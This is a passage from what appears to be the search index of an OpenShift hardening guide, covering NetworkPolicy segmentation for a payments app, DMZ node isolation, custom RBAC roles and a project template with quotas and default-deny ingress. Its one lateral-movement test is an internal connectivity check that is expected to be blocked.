CompromisedPod -. \u274c .-&gt; AssetCache</code></pre> <pre><code># Policy to allow Ingress traffic to 'asset-cache' (and 'webapp')\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: allow-from-openshift-ingress-to-asset-cache\n  namespace: frontend\nspec: \n  podSelector:\n    matchLabels:\n      app: asset-cache\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          network.openshift.io/policy-group: ingress # OpenShift Router Label\n</code></pre>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#pattern-allow-controlled-egress-to-backend","title":"Pattern: Allow Controlled Egress to Backend","text":"<ul> <li>Explanation: The main app (<code>webapp</code>) needs to make necessary outbound calls to <code>backend</code> services (like <code>checkout</code>, <code>reports</code>, etc.). Critically, we allow communication only to the <code>backend</code> namespace, not the <code>payments</code> namespace.</li> <li>Why it Matters: The <code>webapp</code> should never talk directly to the <code>payments</code> vault; it must go through the dedicated <code>checkout</code> service in the <code>backend</code>.</li> </ul> <pre><code>flowchart LR\n    DNS[DNS 5353/UDP]\n    subgraph ns_frontend [\"namespace: frontend\"]\n        Webapp[app=webapp]\n    end\n    subgraph ns_backend [\"namespace: backend\"]\n        Checkout[app=checkout]\n        Catalog[app=catalog]\n    end\n    subgraph ns_payments [\"namespace: payments\"]\n        Gateway[app=gateway]\n    end\n    Webapp --&gt; Checkout\n    Webapp --&gt; DNS\n    Webapp -. \u274c .-&gt; Gateway\n    Webapp -. \u274c .-&gt; Catalog</code></pre> <pre><code># Policy for 'webapp' Egress to 'backend' (Partial example)\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: webapp-netpol\n  namespace: frontend\nspec:\n  podSelector:\n    matchLabels:\n      app: webapp\n  policyTypes:\n  - Egress\n  egress:\n  - ports:\n    - port: 8080\n      protocol: TCP\n    to:\n    - namespaceSelector:\n        matchLabels:\n          kubernetes.io/metadata.name: backend\n      podSelector:\n        matchLabels:\n          app: checkout # Explicitly allows communication to the checkout service only\n  - ports:\n    - port: 5353\n      protocol: UDP # Must allow DNS resolution\n</code></pre>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#step-3-harden-the-payments-vault","title":"Step 3: Harden the Payments Vault","text":"<p>This is the most critical isolation zone. We ensure that only the validated <code>checkout</code> service can initiate payment flows.</p>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#pattern-gateway-as-single-entry-point","title":"Pattern: Gateway as Single Entry Point","text":"<ul> <li>Explanation: The <code>gateway</code> is the single authorized entry point into the <code>payments</code> namespace. We enforce that only the <code>backend/checkout</code> pod can reach it.</li> <li>Why it Matters: This prevents any pod from <code>frontend</code> (like the compromised <code>asset-cache</code>) from bypassing the business logic layer and reaching the payment gateway.</li> </ul> <pre><code>flowchart LR\n    subgraph ns_frontend [\"namespace: frontend\"]\n        AssetCache[app=asset-cache]\n    end\n    subgraph ns_backend [\"namespace: backend\"]\n        Checkout[app=checkout]\n        Reports[app=reports]\n    end\n    subgraph ns_payments [\"namespace: payments\"]\n        Gateway[app=gateway]\n    end\n    Checkout --&gt; Gateway\n    Reports -. \u274c .-&gt; Gateway\n    AssetCache -. \u274c .-&gt; Gateway</code></pre> <pre><code># Policy for 'gateway' Ingress\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: gateway-netpol\n  namespace: payments\nspec:\n  podSelector:\n    matchLabels:\n      app: gateway\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - namespaceSelector:\n        matchLabels:\n          kubernetes.io/metadata.name: backend\n      podSelector:\n        matchLabels:\n          app: checkout # ONLY 'checkout' is allowed to call\n    ports:\n    - protocol: TCP\n      port: 8080\n</code></pre>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#pattern-internal-processor-lockdown","title":"Pattern: Internal Processor Lockdown","text":"<ul> <li>Explanation: Payment processors (<code>visa-processor</code>, <code>mastercard-processor</code>) are strictly internal. They must only accept connections from the trusted <code>gateway</code> pod within their same namespace.</li> <li>Why it Matters: This ensures even if a pod in the <code>backend</code> or <code>frontend</code> were compromised, they cannot communicate directly with the processor, completing the lateral movement defense.</li> </ul> <pre><code>flowchart LR\n    DNS[DNS 5353/UDP]\n    subgraph ns_payments [\"namespace: payments\"]\n        Gateway[app=gateway]\n        VisaProc[app=visa-processor]\n        MasterCard[app=mastercard-processor]\n    end\n    Gateway --&gt; VisaProc\n    Gateway --&gt; MasterCard\n    Gateway --&gt; DNS\n    VisaProc -. \u274c .-&gt; MasterCard\n    MasterCard -. \u274c .-&gt; Gateway</code></pre> <pre><code># Policy for 'visa-processor' Ingress (Internal only)\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: visa-processor-netpol\n  namespace: payments\nspec:\n  podSelector:\n    matchLabels:\n      app: visa-processor\n  policyTypes:\n  - Ingress\n  ingress:\n  - from:\n    - podSelector:\n        matchLabels:\n          app: gateway # ONLY the local 'gateway' pod can connect\n    ports:\n    - protocol: TCP\n      port: 8080\n</code></pre>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#step-4-enabling-dns-resolution-critical-egress","title":"Step 4: Enabling DNS Resolution (Critical Egress)","text":"<p>When using a Default Deny Egress policy, DNS lookups are blocked by default. To ensure the microservices can resolve hostnames (e.g., calling services or external APIs), Egress traffic to the cluster's DNS service on UDP port 53 (or 5353) must be explicitly permitted for every pod that needs it.</p>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#pattern-allow-egress-for-dns","title":"Pattern: Allow Egress for DNS","text":"<ul> <li>Explanation: This Egress rule ensures pods like <code>gateway</code> (in <code>payments</code>) can still perform necessary hostname lookups without breaking the Default Deny posture.</li> <li>Why it Matters: Service connectivity fails silently without this exception.</li> </ul> <pre><code>flowchart LR\n    Pod[Pod in payments/frontend]\n    DNS_SVC[Kube DNS Service]\n    Internet[External IP/Service]\n    Pod --&gt;|UDP 5353| DNS_SVC\n    Pod -. \u274c .-&gt; Internet</code></pre> <pre><code># Example: Adding DNS Egress to the 'gateway-netpol' in the payments namespace\n# This snippet modifies the existing policy by including the DNS rule.\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: gateway-netpol\n  namespace: payments\nspec:\n  podSelector:\n    matchLabels:\n      app: gateway\n  policyTypes:\n  - Egress # Must be in the Egress section\n  egress:\n  # All existing Egress rules (e.g., to visa-processor) go here...\n  - ports:\n    - protocol: TCP\n      port: 8080\n    to:\n    - podSelector:\n        matchLabels:\n          app: visa-processor\n  # --- ADD DNS RULE ---\n  - ports:\n    - protocol: UDP\n      port: 5353 # Common port for KubeDNS\n</code></pre>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#verification-testing","title":"Verification &amp; Testing","text":"<p>Verify that the Network Policies effectively block lateral movement while allowing legitimate traffic.</p>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#1-test-blocked-access-lateral-movement-attempt","title":"1. Test Blocked Access (Lateral Movement Attempt)","text":"<p>Attempt to access the restricted <code>visa-processor</code> service from the compromised <code>asset-cache</code> pod in the <code>frontend</code> namespace.</p> <pre><code># Get the asset-cache pod name\nASSET_POD=$(oc get pod -n frontend -l app=asset-cache -o jsonpath='{.items[0].metadata.name}')\n\n# Attempt connection (Should FAIL/TIMEOUT)\noc exec -n frontend $ASSET_POD -- curl -s --connect-timeout 5 http://visa-processor-service.payments.svc:8080 &gt;/dev/null &amp;&amp; echo \"CONNECTION ALLOWED\" || echo \"CONNECTION BLOCKED\"\n</code></pre> <p>Expected Result: <code>CONNECTION BLOCKED</code></p>"},{"location":"networking/networkpolicies/protecting-the-network-using-networkpolicies/#2-test-allowed-access-legitimate-traffic","title":"2. Test Allowed Access (Legitimate Traffic)","text":"<p>Verify that the <code>gateway</code> component in the <code>payments</code> namespace can still communicate with <code>visa-processor</code>.</p> <pre><code># Get the gateway pod name\nGATEWAY_POD=$(oc get pod -n payments -l app=gateway -o jsonpath='{.items[0].metadata.name}')\n\n# Attempt connection (Should SUCCEED)\noc exec -n payments $GATEWAY_POD -- curl -s --connect-timeout 5 http://visa-processor-service.payments.svc:8080 &gt;/dev/null &amp;&amp; echo \"CONNECTION ALLOWED\" || echo \"CONNECTION BLOCKED\"\n</code></pre> <p>Expected Result: <code>CONNECTION ALLOWED</code></p>"},{"location":"networking/zones/","title":"Network Segmentation and Zone Isolation","text":"<p>Network segmentation is a critical security architectural pattern that involves dividing a network into smaller, distinct sub-networks or \"zones\". This practice effectively isolates systems based on their function, sensitivity, and risk profile.</p>"},{"location":"networking/zones/#why-zone-isolation-matters","title":"Why Zone Isolation Matters","text":"<p>In a shared infrastructure, an attacker who compromises a single edge service often gains unrestricted visibility and access to internal systems. Segregation mitigates this risk by:</p> <ul> <li>Mitigating Shared Kernel Risks: Containers on the same node share the host Linux kernel. If a privileged application escapes to the host (container breakout), it could compromise all other applications running on that same node. Segregating risky workloads to dedicated nodes isolates this threat.</li> <li>Limiting the Blast Radius: Containing a breach to a specific zone prevents lateral movement to critical internal databases or management planes.</li> <li>Defense in Depth: Adding physical or logical separation acts as an additional layer of security beyond authentication and authorization.</li> <li>Simplifying Compliance: Isolating data subject to regulations (like PCI-DSS or HIPAA) reduces the scope of audits.</li> <li>Traffic Control: Enforcing strict rules on what traffic can flow between zones (e.g., DMZ to Internal).</li> </ul> <p>This guide demonstrates how to implement physical and logical isolation in OpenShift using Node Selectors and Namespaces.</p>"},{"location":"networking/zones/#0-setup-create-namespace-label-node","title":"0. Setup: Create Namespace &amp; Label Node","text":"<p>First, let's set up the environment by creating the namespace and defining the node label.</p> <p>1. Create the Namespace:</p> <pre><code>oc create ns dmz\noc label ns dmz env=restricted\n</code></pre> <p>2. Force Pods to the DMZ Zone: Patch the namespace configuration. This ensures that every pod deployed in <code>dmz</code> automatically gets the <code>nodeSelector: dmz=true</code> applied to it, even if the deployment yaml doesn't specify it.</p> <pre><code>oc patch ns dmz -p '{\"metadata\":{\"annotations\":{\"openshift.io/node-selector\":\"dmz=true\"}}}'\n</code></pre> <p>3. Designate a DMZ Node: Select a worker node to serve as the physical isolation zone.</p> <pre><code># Select a node to label\noc get nodes\n\n# Apply the label (replace &lt;node_name&gt;)\noc label node compute-0 dmz=true\n</code></pre>"},{"location":"networking/zones/#1-the-demo-deploy-and-verify","title":"1. The Demo: Deploy and Verify","text":"<p>Since we have already labeled our node <code>dmz=true</code> and patched the <code>dmz</code> namespace, any pod we create here will be forced onto that specific hardware.</p> <p>Deploy the pod:</p> <pre><code>oc run dmz-app --image=registry.access.redhat.com/ubi8/httpd-24 -n dmz\n</code></pre> <p>Check where it is running:</p> <pre><code>oc get pod dmz-app -n dmz -o wide\n</code></pre> <p>In the output, look at the NODE column. It will match the specific node you labeled. If you try to deploy this same pod in a different namespace (e.g., <code>default</code>), it would land on an internal node instead.</p>"},{"location":"networking/zones/#proof-of-enforcement-shifting-the-dmz-boundary","title":"Proof of Enforcement: Shifting the DMZ Boundary","text":"<p>To prove that the workload follows the label and not just a specific machine, let's move the <code>dmz=true</code> label to a different node.</p> <ol> <li> <p>Remove the label from the current node: <pre><code># Ensure you replace &lt;current_node&gt; with the one from the previous step (e.g., compute-0)\noc label node compute-0 dmz-\n</code></pre></p> </li> <li> <p>Apply the label to a new node: <pre><code># Pick a different worker node (e.g., compute-1)\noc label node compute-1 dmz=true\n</code></pre></p> </li> <li> <p>Redeploy the application:     Since the Node Selector is enforced at scheduling time, we delete the old pod and recreate it to see the scheduler force it onto the new DMZ node.</p> <pre><code>oc delete pod dmz-app -n dmz\noc run dmz-app --image=registry.access.redhat.com/ubi8/httpd-24 -n dmz\n</code></pre> </li> <li> <p>Verify the migration: <pre><code>oc get pod dmz-app -n dmz -o wide\n</code></pre>     The pod has now \"jumped\" to the new \"safe\" hardware holding the <code>dmz=true</code> label.</p> </li> </ol>"},{"location":"networking/zones/#2-concept-nodes-and-node-groups","title":"2. Concept: Nodes and Node Groups","text":"<p>In OpenShift, Nodes are the physical or virtual machines where your code actually runs. By default, OpenShift treats all worker nodes as a single \"pool\" of resources.</p> <p>However, for security classifications, we use Node Groups (logical sets of nodes) to create isolation boundaries:</p> <ul> <li> <p>Default Behavior (Shared): Without configuration, a \"high-risk\" web app and a \"sensitive\" internal database could run on the same CPU, sharing the same RAM and Linux kernel.</p> </li> <li> <p>Dedicated Groups: By using labels (like <code>dmz=true</code>), we slice the cluster into specialized zones.</p> </li> <li> <p>Infrastructure Nodes: A best practice involves dedicating specific nodes solely for platform components, most notably the Ingress Controllers (Router). Since the Ingress Controller is the front door handling all incoming HTTP/HTTPS traffic and TLS termination, isolating it ensures that high-load application logic cannot starve the routing layer of resources. It also creates a security boundary where the \"traffic handling\" layer is physically separate from the \"business logic\" layer.</p> </li> </ul> <pre><code>graph TD\n    subgraph Internet[\"\ud83c\udf10 PUBLIC INTERNET\"]\n        ExternalUser((Public User))\n    end\n\n    subgraph Cluster[\"\u2638\ufe0f OPENSHIFT CLUSTER BOUNDARY\"]\n\n        subgraph DMZ_Zone[\"\ud83d\udd34 DMZ ZONE (Untrusted)\"]\n            direction TB\n            Ext_Ingress[/\"&lt;b&gt;Dedicated DMZ Router&lt;/b&gt;&lt;br/&gt;(Ingress Controller Pods)&lt;br/&gt;NodeRole: infra-dmz\"/]\n            DMZ_Worker[\"&lt;b&gt;DMZ Compute Nodes&lt;/b&gt;&lt;br/&gt;Label: dmz=true&lt;br/&gt;Apps: ubi-httpd\"]\n        end\n\n        subgraph Management_Plane[\"\u2699\ufe0f CONTROL PLANE (Management)\"]\n            MasterAPI[\"Master API Server\"]\n        end\n\n        subgraph Internal_Zone[\"\ud83d\udd35 INTERNAL ZONE (Trusted)\"]\n            direction TB\n            Int_Ingress[/\"&lt;b&gt;Default Internal Router&lt;/b&gt;&lt;br/&gt;(Ingress Controller Pods)&lt;br/&gt;NodeRole: infra-internal\"/]\n            Int_Worker[\"&lt;b&gt;Internal Compute Nodes&lt;/b&gt;&lt;br/&gt;Label: dmz=false&lt;br/&gt;Apps: Internal APIs / DBs\"]\n        end\n    end\n\n    %% Traffic Flow\n    ExternalUser --&gt;|LB / Port 443| Ext_Ingress\n    Ext_Ingress --&gt;|VLAN / SDN| DMZ_Worker\n\n    %% Communication Barriers\n    DMZ_Worker -.-x|Forbidden| Internal_Zone\n    DMZ_Worker -.-&gt;|NetworkPolicy: Restricted| MasterAPI\n\n    %% Logic\n    classDef dmzNode fill:#fff1f0,stroke:#cf1322,stroke-width:2px;\n    classDef intNode fill:#f0f5ff,stroke:#1d39c4,stroke-width:2px;\n    class DMZ_Worker,Ext_Ingress dmzNode;\n    class Int_Worker,Int_Ingress intNode;</code></pre>"},{"location":"networking/zones/#why-we-do-this-classification-logic","title":"Why we do this (Classification Logic):","text":"<ol> <li> <p>Blast Radius: If an internet-facing app is compromised via a zero-day exploit, the attacker is \"trapped\" on the DMZ nodes. They cannot easily use kernel exploits to jump to pods on internal nodes because those pods aren't physically there.</p> </li> <li> <p>Kernel Isolation: While Namespaces and SCCs provide logical isolation, the Kernel is a shared component. Dedicated nodes ensure that sensitive data never enters the memory space of a machine that is processing untrusted internet traffic.</p> </li> </ol>"},{"location":"networking/zones/#a-note-on-taints-and-tolerations","title":"A Note on Taints and Tolerations","text":"<p>Another common Kubernetes isolation mechanism involves Taints and Tolerations:</p> <ul> <li>Taints are applied to a Node to \"repel\" pods. They act like a \"Do Not Enter\" sign.</li> <li>Tolerations are applied to a Pod to keycard through that sign.</li> </ul> <p>We are NOT using Taints in this specific demo. Instead, we rely on Node Selectors (Affinity). While Taints are excellent for ensuring other workloads don't accidentally land on your node (repulsion), Node Selectors are the primary mechanism to force your specific workload onto a target node (attraction). For this guide, directing our DMZ traffic to the DMZ node via <code>NodeSelectors</code> is the primary control.</p>"},{"location":"networking/zones/#3-summary-of-the-security-stack","title":"3. Summary of the Security Stack","text":"<p>When you combine these features, you create a \"Hardened\" environment:</p> Feature Level Purpose Namespaces Logical Keeps teams from seeing each other's configuration. SCC (<code>restricted-v2</code>) Process Strips the container of \"Root\" powers and dangerous system calls. Node Selectors Physical Ensures \"Exposed\" apps never share a kernel with \"Internal\" apps. <p>By using the Namespace Node Selector method we set up, you have implemented a \"Guardrail.\" The classification is enforced at the platform level\u2014even if a developer makes a mistake in their deployment code, the platform will force the application to stay in its designated zone.</p>"},{"location":"rbac/custom-roles/","title":"Granular Governance: Custom RBAC Roles","text":"<p>In this demo, we move beyond generic permissions. We will create a custom role specifically for a \"Security Auditor\" who needs to inspect network policies and resource quotas but should not be allowed to see logs or application data.</p>"},{"location":"rbac/custom-roles/#1-why-custom-roles","title":"1. Why Custom Roles?","text":"<p>Default roles are \"bundled\" permissions. For example, the <code>view</code> role allows a user to see almost everything in a namespace. A Custom Role allows you to follow the Principle of Least Privilege to the letter by selecting only the specific API \"Verbs\" and \"Resources\" required for a task.</p>"},{"location":"rbac/custom-roles/#step-0-setup-namespaces","title":"Step 0: Setup Namespaces","text":"<pre><code># Create the namespaces for the Auditor (payments) and Monitoring (management) scenarios\noc create ns payments\noc create ns management\n</code></pre>"},{"location":"rbac/custom-roles/#2-defining-the-custom-role","title":"2. Defining the Custom Role","text":"<p>Instead of a single command, we define a Custom Role using a YAML definition (or <code>oc create clusterrole</code>).</p>"},{"location":"rbac/custom-roles/#step-1-create-the-role-definition","title":"Step 1: Create the Role Definition","text":"<p>We want a role that can only look at security-related configurations.</p> <pre><code># Create a local Role for a specific namespace\noc create role security-inspector \\\n  --verb=get,list,watch \\\n  --resource=networkpolicies,resourcequotas,limitranges \\\n  -n payments\n</code></pre>"},{"location":"rbac/custom-roles/#step-2-view-the-structure","title":"Step 2: View the Structure","text":"<p>Inspect the role to see how OpenShift maps these to API Groups:</p> <pre><code>oc get role security-inspector -n payments -o yaml\n</code></pre> <p>Coaching Note: Notice the <code>apiGroups</code> field. This tells OpenShift exactly which API category (like <code>networking.k8s.io</code>) the user is allowed to access.</p>"},{"location":"rbac/custom-roles/#3-identity-binding","title":"3. Identity &amp; Binding","text":"<p>Just like with default roles, we must \"glue\" this custom role to a subject.</p>"},{"location":"rbac/custom-roles/#step-1-create-the-auditor-persona","title":"Step 1: Create the Auditor Persona","text":"<pre><code>oc create user regional-auditor\noc adm groups new audit-team\noc adm groups add-users audit-team regional-auditor\n</code></pre>"},{"location":"rbac/custom-roles/#step-2-bind-the-custom-role","title":"Step 2: Bind the Custom Role","text":"<pre><code># Bind the custom 'security-inspector' role to the audit group\noc adm policy add-role-to-group security-inspector audit-team -n payments\n</code></pre>"},{"location":"rbac/custom-roles/#4-verification-the-surgical-check","title":"4. Verification: The \"Surgical\" Check","text":"<p>Because this is a custom role, we need to verify that the permissions are strictly limited to what we defined.</p>"},{"location":"rbac/custom-roles/#scenario-testing-granularity","title":"Scenario: Testing Granularity","text":"<pre><code># 1. Can I see the Network Policies? \n# Result: YES (Explicitly allowed)\noc auth can-i get networkpolicies -n payments --as=regional-auditor\n\n# 2. Can I see the Pods? \n# Result: NO (The 'view' role allows this, but our custom role DOES NOT)\noc auth can-i get pods -n payments --as=regional-auditor\n\n# 3. Can I see the Resource Quotas? \n# Result: YES (Explicitly allowed)\noc auth can-i get resourcequotas -n payments --as=regional-auditor\n</code></pre>"},{"location":"rbac/custom-roles/#5-custom-serviceaccount-roles","title":"5. Custom ServiceAccount Roles","text":"<p>Custom roles are most powerful when applied to ServiceAccounts. For example, a monitoring microservice (like Prometheus) only needs to \"collect\" metrics, not manage the cluster.</p> <pre><code># 1. Create a SA for a monitoring tool\noc create sa metric-collector -n management\n\n# 2. Create a Custom Role for metrics only\noc create clusterrole metric-reader \\\n  --verb=get,list \\\n  --resource=pods,nodes/metrics\n\n# 3. Bind it\noc adm policy add-cluster-role-to-user metric-reader \\\n  system:serviceaccount:management:metric-collector\n</code></pre>"},{"location":"rbac/custom-roles/#6-pro-tip-clusterrole-vs-role","title":"6. Pro-Tip: ClusterRole vs. Role","text":"<ul> <li>Role: Applied to a single namespace. Use this for application-specific security (like our Auditor in <code>payments</code>).</li> <li>ClusterRole: Applied cluster-wide. Use this for infrastructure tools or users who need to see resources across all namespaces (like a global Admin or a Monitoring SA).</li> </ul>"},{"location":"rbac/multi-tenancy/","title":"Multi-tenancy on OpenShift: Projects vs. Namespaces","text":"<p>In an enterprise environment, a single cluster often hosts hundreds of applications across dozens of departments. Multi-tenancy is the strategy of allowing these \"tenants\" to share the same infrastructure safely. In OpenShift, the Project is the primary mechanism for enforcing this isolation.</p> <p>However, true multi-tenancy requires looking beyond just the software layer. When hosting diverse applications, we must consider Data Classification. Running a highly sensitive \"Restricted\" application on the same worker node (and the same Kernel) as a \"Public\" application introduces a risk of \"container breakout\" attacks. To mitigate this, enterprise designs often use Node Selectors and Taints/Tolerations to create dedicated pools of hardware based on the application's sensitivity, ensuring that different classifications never share the same physical memory or CPU cycles.</p>"},{"location":"rbac/multi-tenancy/#1-project-vs-namespace-whats-the-difference","title":"1. Project vs. Namespace: What\u2019s the difference?","text":"<p>If you are coming from standard Kubernetes, you are familiar with Namespaces. In OpenShift, a Project is essentially a \"Namespace on steroids.\" It is a wrapper that adds enterprise-grade governance to the basic logical partition.</p> Feature Kubernetes Namespace OpenShift Project Core Object A simple logical partition for resources. A Kubernetes Namespace plus administrative metadata. RBAC Requires manual setup of RoleBindings. Automatically assigns the requester as the <code>admin</code> of that project. Security Minimal default isolation; relies on manual config. Enforces Security Context Constraints (SCCs) and isolation immediately. Governance No built-in self-service workflow. Includes a formal <code>ProjectRequest</code> provisioning workflow. Automation Standard, empty creation. Can be pre-populated via Project Templates (Quotas, Policies)."},{"location":"rbac/multi-tenancy/#2-multi-tenant-isolation-the-boundary-of-trust","title":"2. Multi-tenant Isolation: The \"Boundary of Trust\"","text":"<p>Multi-tenancy requires more than just a separate \"folder\" for your resources; it requires a hardened boundary that prevents cross-tenant interference.</p>"},{"location":"rbac/multi-tenancy/#administrative-isolation-separation-of-duties","title":"Administrative Isolation &amp; Separation of Duties","text":"<p>OpenShift uses the Project boundary to scope RBAC and enforce a strict Separation of Duties (SoD). This ensures that responsibilities are divided among different individuals to prevent fraud and error:</p> <ul> <li>Project Admin vs. Cluster Admin: A Project Admin can manage their own team's deployments, services, and secrets but has no permission to modify cluster-wide configurations, storage classes, or nodes.</li> <li>Developer vs. Operator: By using specific Roles (e.g., <code>edit</code> vs. <code>view</code>), you can ensure that developers can write code but cannot modify the underlying Project quotas or network policies.</li> <li>Visibility: A user with <code>admin</code> rights in the <code>frontend</code> project has zero visibility into the <code>payments</code> project. Even accidental actions are physically constrained to the user's specific project.</li> </ul>"},{"location":"rbac/multi-tenancy/#network-isolation-the-deny-all-standard","title":"Network Isolation (The \"Deny-All\" Standard)","text":"<p>A critical part of \"Proper RBAC\" is ensuring that network traffic is as restricted as user permissions. It is vital to understand that by default, OpenShift (like standard Kubernetes) allows all traffic between pods across different projects. To achieve a Zero Trust model, we must use the Project Template to enforce guardrails:</p> <ul> <li>Default Deny Ingress: By including this in a template, you ensure that every new project starts by blocking all incoming traffic from sources outside the project. Communication is only possible if a developer explicitly defines a \"hole\" for a specific service.</li> <li>Default Deny Egress: This ensures pods cannot make outgoing calls to other projects or the external internet unless specifically authorized.</li> <li>Why this matters: If a hacker gains access to a pod in the <code>frontend</code> project, they naturally want to move laterally. Without these guardrails, the network is wide open. With them, the hacker is \"trapped\" in the frontend project, unable to \"hop\" across the network to attack the <code>payments</code> database.</li> </ul>"},{"location":"rbac/multi-tenancy/#3-resource-governance-quotas-and-limits","title":"3. Resource Governance: Quotas and Limits","text":"<p>In a shared cluster, \"Resource Exhaustion\" is a major threat. A single leaky application could consume all the cluster's memory, causing a denial of service for every other team. OpenShift manages this via the Project.</p>"},{"location":"rbac/multi-tenancy/#resource-quotas-the-project-budget","title":"Resource Quotas (The Project Budget)","text":"<p>A ResourceQuota provides a hard ceiling on the total resource consumption for the entire Project.</p> <ul> <li>CPU/Memory: Limits the aggregate sum of all container requests/limits.</li> <li>Object Counts: Limits the number of ConfigMaps, Secrets, or Services a team can create.</li> </ul>"},{"location":"rbac/multi-tenancy/#limit-ranges-the-container-rules","title":"Limit Ranges (The Container Rules)","text":"<p>While Quotas govern the whole project, LimitRanges govern individual pods. They ensure that every container stays within a \"sane\" size range.</p> <ul> <li>Defaults: If a developer forgets to define memory limits, OpenShift automatically injects the default values defined in the LimitRange.</li> <li>Enforcement: Prevents a developer from deploying a single pod that is so large it consumes the entire Project's quota.</li> </ul>"},{"location":"rbac/project-demo/","title":"Demo: Hardening the OpenShift Project Factory","text":"<p>In this demo, we will automate the creation of a Custom Project Template. This ensures that every time a developer requests a new project, it is born with a Resource Quota, LimitRange, Network Policy, and Security Labels automatically injected.</p>"},{"location":"rbac/project-demo/#1-environment-setup-cluster-admin","title":"1. Environment Setup (Cluster Admin)","text":"<p>To modify global governance, you must be logged in as a user with <code>cluster-admin</code> privileges.</p> <pre><code># Verify your administrative access\noc auth can-i '*' '*' --all-namespaces\n</code></pre>"},{"location":"rbac/project-demo/#2-generate-the-security-components","title":"2. Generate the Security Components","text":"<p>We will generate our \"ingredients\" in JSON format so we can process them with <code>jq</code>.</p>"},{"location":"rbac/project-demo/#step-a-the-base-blueprint","title":"Step A: The Base Blueprint","text":"<p>Capture the default internal OpenShift project structure.</p> <pre><code>oc adm create-bootstrap-project-template -o json &gt; template.json\n</code></pre>"},{"location":"rbac/project-demo/#step-b-the-resource-quota-the-total-budget","title":"Step B: The Resource Quota (The Total Budget)","text":"<p>Create a quota to prevent \"noisy neighbors\" from consuming all cluster resources.</p> <pre><code>oc create quota project-quota --hard=cpu=4,memory=8Gi -o json --dry-run=client &gt; quota.json\n</code></pre>"},{"location":"rbac/project-demo/#step-c-the-limitrange-the-container-rules","title":"Step C: The LimitRange (The Container Rules)","text":"<p>This ensures every container has a default size and stays within sane boundaries.</p> <pre><code>cat &lt;&lt;EOF &gt; limits.json\n{\n  \"kind\": \"LimitRange\",\n  \"apiVersion\": \"v1\",\n  \"metadata\": {\n    \"name\": \"project-limits\"\n  },\n  \"spec\": {\n    \"limits\": [\n      {\n        \"type\": \"Container\",\n        \"default\": {\n          \"cpu\": \"500m\",\n          \"memory\": \"1Gi\"\n        },\n        \"defaultRequest\": {\n          \"cpu\": \"200m\",\n          \"memory\": \"512Mi\"\n        },\n        \"max\": {\n          \"cpu\": \"2\",\n          \"memory\": \"2Gi\"\n        }\n      }\n    ]\n  }\n}\nEOF\n</code></pre>"},{"location":"rbac/project-demo/#step-d-the-deny-all-ingress-the-firewall","title":"Step D: The Deny-All Ingress (The Firewall)","text":"<p>Note that OpenShift is \"Allow-All\" by default; this policy overrides that behavior.</p> <pre><code>cat &lt;&lt;EOF &gt; deny-ingress.json\n{\n  \"kind\": \"NetworkPolicy\",\n  \"apiVersion\": \"networking.k8s.io/v1\",\n  \"metadata\": {\n    \"name\": \"default-deny-ingress\"\n  },\n  \"spec\": {\n    \"podSelector\": {},\n    \"policyTypes\": [\"Ingress\"]\n  }\n}\nEOF\n</code></pre>"},{"location":"rbac/project-demo/#3-the-automated-assembly-the-jq-magic","title":"3. The Automated Assembly (The <code>jq</code> Magic)","text":"<p>We will use <code>jq</code> to \"glue\" our custom security objects into the master template's <code>objects</code> array and inject a custom security label into the Namespace metadata.</p> <pre><code># Merge Budget, Limits, and Firewall into the Blueprint\njq --slurpfile q quota.json \\\n   --slurpfile l limits.json \\\n   --slurpfile n deny-ingress.json \\\n   '.objects += ($q + $l + $n)' \\\n   template.json &gt; final-custom-template.json\n</code></pre>"},{"location":"rbac/project-demo/#4-activate-global-governance","title":"4. Activate Global Governance","text":"<p>Now we upload the blueprint and patch the cluster to enforce it.</p> <pre><code># 1. Upload the template to the global configuration namespace\noc create -f final-custom-template.json -n openshift-config\n\n# 2. Patch the cluster to use this blueprint for ALL new projects\noc patch project.config.openshift.io/cluster --type=merge \\\n  -p '{\"spec\":{\"projectRequestTemplate\":{\"name\":\"project-template\"}}}'\n</code></pre>"},{"location":"rbac/project-demo/#5-the-reveal-verification","title":"5. The Reveal: Verification","text":"<p>We now simulate a developer creating a project to observe the multi-layered governance in action.</p> <pre><code># 1. Create a new team project\noc new-project secure-app-demo\n\n# 2. Verify Metadata: Check for our custom security label\noc get namespace secure-app-demo --show-labels\n\n# 3. Verify Ingress: This proves Zero-Trust is active Day 0\noc get networkpolicy -n secure-app-demo\n\n# 4. Verify Admission Control: Check Quota and LimitRange\noc get quota,limitrange -n secure-app-demo\n</code></pre>"},{"location":"rbac/project-demo/#6-key-takeaways-for-the-audience","title":"6. Key Takeaways for the Audience","text":"<ul> <li>Automation over Manual Effort: Security and governance were injected at birth without manual intervention.</li> <li>Granular Control: We controlled the total budget (Quota), the individual container sizes (LimitRange), and the network entry points (NetworkPolicy).</li> <li>Environment Consistency: Every project on the cluster now adheres to the same baseline security posture, reducing the risk of human error during setup..</li> </ul>"},{"location":"rbac/project-demo/#7-cleanup-resetting-the-cluster","title":"7. Cleanup (Resetting the Cluster)","text":"<pre><code># Remove the template pointer from the global configuration\noc patch project.config.openshift.io/cluster --type=json \\\n  -p '[{\"op\": \"remove\", \"path\": \"/spec/projectRequestTemplate\"}]'\n\n# Delete the template from the config namespace\noc delete template project-template -n openshift-config\n</code></pre>"},{"location":"rbac/rbac-intro/","title":"Mastering RBAC: Governance for Microservices","text":"<p>Role-Based Access Control (RBAC) isn't just about permissions; it\u2019s about intent. In this demo, we implement a Least Privilege model for a 3-tier application: <code>frontend</code>, <code>backend</code>, and <code>payments</code>.</p>"},{"location":"rbac/rbac-intro/#1-the-rbac-trinity","title":"1. 